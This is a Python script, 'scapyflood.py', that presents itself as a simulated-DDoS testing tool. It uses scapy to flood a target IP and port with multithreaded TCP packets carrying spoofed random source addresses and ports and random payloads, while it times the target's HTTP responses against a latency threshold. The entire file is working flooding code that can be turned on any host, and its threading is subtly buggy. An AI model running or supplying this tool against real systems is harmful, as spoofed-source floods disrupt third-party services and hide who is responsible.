#!/usr/bin/env python



#scapyflood.py, a tool to do simulated ddos testing with scapy
#randomizes source port and ip address

#By @arbitrary_code

try:
#yikes, clean this up!
	from scapy.all import *

	import argparse
	import random
	import socket
	import sys
	import time
	import requests
	import ssl
	import math
	import threading
	import os
except ImportError as e:
	raise ImportError('Error importing!')
	print e


class Flood:

	def cls(self):
	    os.system('cls' if os.name == 'nt' else 'clear')

	def attack(self, args, dstUrl, dstIp, dstPort, multiplier, threads, payloadLen):
		#attack loop
		while 1:

			#queue timer
			startTime=time.time()

			#run a check every x seconds
			try:
			#uses http://docs.python-requests.org/en/master/api/
				response = requests.get(dstUrl) #basic auth needs a header Authorization: Basic 
			except requests.exceptions.RequestException as e:
				print e
				sys.exit(1)
			#measure ET
			elapsedTime = str(round((time.time()-startTime)*1000.0))

			#tell the user
			print 'Target web server '+ str(dstIp)+' responded with HTTP ' +str(response.status_code)+' in '+"{:<1}".format(str(elapsedTime)) +'ms'




			#set random source ip
			srcIp = '.'.join('%s'%random.randint(0, 255) for i in range(4))

			#set random source port
			srcPort = ''.join('%s'%random.randint(1,65535))

			#tell user what's happening
			if args.verbose is True:print '[!] Attacking %s on port %s from %s using source port %s' % (dstIp, dstPort, srcIp, srcPort)


			payload = ''.join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM') for r in range(int(payloadLen)))

			#threaded jobs list
			jobs = []

			for i in range(0,threads):

				thread = threading.Thread(target=send(IP(src=srcIp, dst=dstIp) / TCP(sport=int(srcPort), dport=int(dstPort)) / payload, count=int(multiplier), verbose=args.verbose))
				if args.verbose is True: print 'sending packet with %s %s %s %s %s'%(srcIp,dstIp,srcPort,dstPort,payload)
				jobs.append(thread)
				
			for j in jobs:
				j.start()

			for j in jobs:
				j.join()

				
			#logic to check threshold
			if float(elapsedTime) <= float(''.join(args.threshold)):
				print 'under DoS threshold'
			else:
				float(elapsedTime) > float(''.join(args.threshold))
				print 'over DoS threshold'
				print 'elapsed time is: %s' % elapsedTime
				print ''.join(args.threshold)
				#delay algorithm takes absolute difference of threshold and observed latency
				delay = abs(float(elapsedTime.split('.')[0]) - float(''.join(args.threshold)))
				print 'DoS threshold of %s met, reducing by %s' % (''.join(args.threshold), str(delay))
				#sleep the loop for the delay value divided by 1000 to get milliseconds
				time.sleep(delay/1000)


			self.cls()

def main():

	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--ipdst', metavar = '127.0.0.1', nargs = 1, help='IP address to attack')
	parser.add_argument('-p', '--port', metavar = '8000', nargs = 1, help='The port to attack')
	#parser.add_argument('-P', '--prot', nargs = 1, metavar ='tcp', help='The protocol to use; i.e.TCP, UDP. default is tcp')
	parser.add_argument('-u', '--url', nargs = 1, metavar = 'http://127.0.0.1:8000', help = 'The URL you want to test.')
	parser.add_argument('-t', '--threshold', nargs = 1, metavar = '250', help = 'The DoS acceptability threshold in ms')
	parser.add_argument('-T', '--threads', nargs = 1, metavar = '2', help ='Number of threads to run, default is 10' )
	parser.add_argument('-v', '--verbose', help='enable verbosity', action = 'store_true')
	parser.add_argument('-m', '--multiplier', nargs=1, metavar = '1000', help='how many packets to send per loop, default is 10')
	parser.add_argument('-l', '--length', nargs = 1, metavar='1000', help='count of random characters to send in payload. default is 10' )
	#parser.add_argument('-s', '--scantype', nargs =1, help='scan type. not implemented')
	args = parser.parse_args()

	#print args if -v
	if args.verbose is True:print args

	#check for non blank to require enteries
	if (args.ipdst is None or \
		args.port is None or \
		#args.prot is None and \
		args.url is None or \
		args.length is None or \
		args.threshold is None):
		parser.print_help()
		sys.exit()

	if args.threads is None:
		threads = 10
	else:
		threads = int(''.join(args.threads))

	if args.multiplier is None:
		multiplier=10
	else:
		multiplier=''.join(args.multiplier)

	if args.length is None:
		length = 10
	else:
		if int(''.join(args.length)) > 65535:
			print '\n [!] Payload must be under 65535\n'
			parser.print_help()
			sys.exit()
		
		if args.length <= 65535:
			length = int(''.join(args.length))




	#if ipdst was entered, check if a valid IP
	if args.ipdst is not None:
		for a in args.ipdst:
			try:
				socket.inet_aton(a)
			except socket.error:
				print '\n [-] Invalid IP address entered: ' + a + '\n'
				sys.exit()
		

	dstIp = ''.join(args.ipdst)
	dstPort = ''.join(args.port)
	dstUrl = ''.join(args.url)
	multiplier = ''.join(args.multiplier)
	payloadLen = ''.join(args.length)


	sendattack = Flood()
	sendattack.cls()
	#sendattack.timer(dstUrl, dstIp)
	sendattack.attack(args, dstUrl, dstIp, dstPort, multiplier, threads, payloadLen)




if __name__ == '__main__':
	
	os.system('cls' if os.name == 'nt' else 'clear')
	main()


'''
scapy stuffs


	#TCP
	#send(IP(src=srcIp, dst=dstIp) / TCP(sport=srcPort, dport=dstPort) / payload )

	#ICMP
	#send(IP(src="10.0.99.100",dst="127.0.0.1")/ICMP()/"Hello World")



'''
